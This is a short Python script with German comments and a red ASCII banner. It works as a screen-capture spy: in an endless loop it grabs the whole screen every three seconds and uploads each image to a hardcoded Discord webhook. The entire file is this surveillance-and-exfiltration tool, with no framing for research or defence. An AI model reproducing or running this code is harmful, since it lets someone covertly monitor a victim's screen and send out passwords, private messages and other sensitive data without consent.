import tempfile
import discord
from PIL import ImageGrab
from discord import SyncWebhook
from time import sleep
import os
from os import system
from colorama import Fore, Style


system("title .gg/lovecode")
cls = lambda: os.system('cls')
cls()

banner = f"""{Fore.RED}
                            ██╗      ██████╗ ██╗   ██╗██╗███████╗        ██╗  ██╗██████╗ 
                            ██║     ██╔═══██╗██║   ██║██║██╔════╝        ██║  ██║██╔══██╗
                            ██║     ██║   ██║██║   ██║██║███████╗        ███████║██║  ██║
                            ██║     ██║   ██║██║   ██║██║╚════██║        ██╔══██║██║  ██║
                            ███████╗╚██████╔╝╚██████╔╝██║███████║███████╗██║  ██║██████╔╝
                            ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═════╝ 
                                                                           
                                                    {Style.RESET_ALL}  
"""
print(banner)

webhook = "https://discord.com/api/webhooks/1024368304787304519/bMDSXJxNpSpOViX-Jb4F4O8o-napRXszWi9LZTNO1tEn0vj8e-iIefPWZAxor11IZP_G" # Deine Webhook URL
webhook = SyncWebhook.from_url(webhook)

while True: # Loop
    with tempfile.TemporaryDirectory() as t:
        snapshot = ImageGrab.grab() # Macht Ein screenshot
        save_path = t + "Capture.jpg" # Speichert Den screenshot
        snapshot.save(save_path)
    with open(file=save_path, mode='rb') as f: # Offnet Denn Ordner
            my_file = discord.File(f)
            webhook.send(file=my_file) # Sendet Den screenshot Zur Webhook
            print(f"screenshot Wurde Gemacht, Ich warte 3 Sekunden")
            sleep(3)

                    
